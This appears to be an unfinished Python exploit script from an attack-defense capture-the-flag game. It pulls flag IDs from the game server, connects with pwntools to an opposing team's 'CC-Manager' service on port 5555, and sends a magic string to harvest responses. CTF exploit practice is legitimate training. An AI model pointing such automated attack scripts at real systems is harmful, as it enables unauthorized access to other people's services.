#!/usr/bin/env python3
import requests
import json
import sys
import random
import string
from pwn import *
import random

def generate(ln=32):
    return ''.join(random.choice(string.ascii_letters + string.digits) for i in range(ln))

addr = sys.argv[1]
team_id= addr.split(".")[2]

PORT = 5555
SERVICE = 'CC-Manager'

FLAGID_URL = 'http://10.10.0.1:8081/flagIds?service={}&team={}'.format(SERVICE,team_id)
flag_ids = json.loads(requests.get(FLAGID_URL).text)
flag_ids = flag_ids[SERVICE][team_id]

r = remote(addr, PORT)

for _round, info in flag_ids.items():
    #Flag Ids Values:
    username = info['username']
    password = info['password']

    r.recvline()
    r.sendline(b"skib")

    bru = r.recvline()
    print(bru, flush=True)